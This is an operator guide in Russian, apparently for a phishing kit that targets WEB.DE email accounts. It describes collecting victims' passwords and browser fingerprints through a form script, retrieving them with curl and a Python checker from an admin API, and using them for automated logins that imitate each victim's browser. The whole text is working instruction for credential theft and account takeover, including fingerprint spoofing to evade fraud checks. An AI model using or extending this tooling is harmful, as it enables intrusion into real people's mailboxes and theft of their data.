# Как проверить: парсинг лида → профиль → эмуляция WEB.DE

## Что считается «работает»

1. **Сбор** — лид хотя бы раз отправил форму с **`fingerprint.js`** (submit / смена пароля): в лиде есть `telemetrySnapshots` или `clientSignals` / `fingerprint`.
2. **Профиль на сервере** — `GET /api/lead-login-context` возвращает **`profile`** с блоком **`playwright.userAgent`** (лучше совпадает с **`navigatorUserAgent`** с визита).
3. **Автовход** — скрипт берёт этот профиль и в логах видно **`[ДИАГНО] контекст браузера`** с тем же engine/viewport/UA; при ошибках — **`[ДИАГНО]`** с URL/title/текстом страницы.

Успешный **вход в WEB.DE** зависит ещё от прокси, блокировок почты и капчи — это отдельно от «работает ли подстановка отпечатка».

---

## Быстрая проверка API (рекомендуется)

Из корня проекта (подставь свой домен админки, токен и `leadId`):

```bash
python3 login/verify_lead_automation.py \
  --server-url https://ТВОЙ_ADMIN_HOST \
  --token "ТВОЙ_BEARER_TOKEN" \
  --lead-id "ID_ЛИДА" \
  --deep
```

- **`--deep`** — дополнительно тянет `/api/lead-fingerprint` и сравнивает UA снимка с профилем.
- Код **0** — контекст и UA в профиле есть; **1** — нет профиля или email (лид не ходил с телеметрией / пустой лид); **2** — сеть/HTTP.

---

## Ручная проверка в браузере / curl

```bash
curl -sS -H "Authorization: Bearer TOKEN" \
  "https://ADMIN/api/lead-login-context?leadId=LEAD_ID" | jq .
```

Смотри:

| Поле | Ожидание |
|------|----------|
| `ok` | `true` |
| `email` | не пусто |
| `profile.playwright.userAgent` | строка как у реального браузера лида |
| `profile.browserEngine` | `chromium` / `webkit` / `firefox` |
| `ipCountry` | две буквы, если заход через Cloudflare с `cf-ipcountry` |
| `profile.playwright.secChUa` | есть, если на запросе лида были Client Hints |

---

## Проверка эмуляции в скрипте

1. Включи автовход для **web.de**-лида (как ты уже делаешь).
2. В логе процесса найди:
   - **`[AUTO-LOGIN] [ДИАГНО] automation_profile`** — есть engine, viewport, `secChUa=да/нет`.
   - **`[WEBDE] [ДИАГНО] контекст браузера`** — `engine=`, `viewport=`, начало `UA`.
   - **`[WEBDE] [Профиль] лид API: engine=…`** — подтверждение, что взят профиль API, а не только пул.
3. Если вместо этого **`automation_profile отсутствует`** — для этого лида нет собранного профиля; нужен новый визит с актуальной страницей (fingerprint + clientSignals).

---

## Типичные причины «не работает эмуляция»

- Лид создан **до** телеметрии или без **`/api/submit`** с **`fingerprint.js`** → `profile: null`.
- В ответе профиль есть, но **Firefox + пресет Chrome** на сайте — в профиле UA будет правильный (Firefox), пул на старых скриптах мог не совпадать; сейчас приоритет у **`navigatorUserAgent`**.
- **`lead_id`** в скрипте **обрезан** — `POST webde-login-result` даст **404**; в логе смотри **`id=… len=…`**.

---

## Логи в терминале сервера (PM2 / Node / Python)

Часть строк пишется в едином виде (хелпер **`lib/terminalFlowLog.js`**):

`[КАНАЛ] поток | попытка | email: действие`

| Канал | Поток | Попытка |
|--------|--------|---------|
| **`ВХОД`** | **Сайт** | обычно **—** (действия жертвы: submit, пароль) |
| **`АДМИН`** | **Админ** / **Автовход** / **Система** | для автовхода — номер сессии запуска скрипта, иначе **—** |
| **`AUTO-LOGIN`** | **Автовход** / **Система** | у запуска скрипта — номер сессии; у очереди/пропусков — **—** |

Дочерний процесс **`lead_simulation_api.py`** после получения email из API пишет строки вида:

`[AUTO-LOGIN] Автовход | — | email: [шаг] сообщение`

**Про «скрипт уже запущен»:** второй запуск с тем же email отклоняется, пока живёт lock (~**10 мин** или до **`/api/webde-login-slot-done`**).

## Связанные файлы

- Сбор профиля: `lib/automationProfile.js`, `lib/leadLoginContext.js`
- Клиент: `public/fingerprint.js`
- Автовход: `login/lead_simulation_api.py`, `login/webde_login.py`
- Проверка формы WEB.DE: `login/webde_layout_healthcheck.py`
- Формат строк терминала: `lib/terminalFlowLog.js`
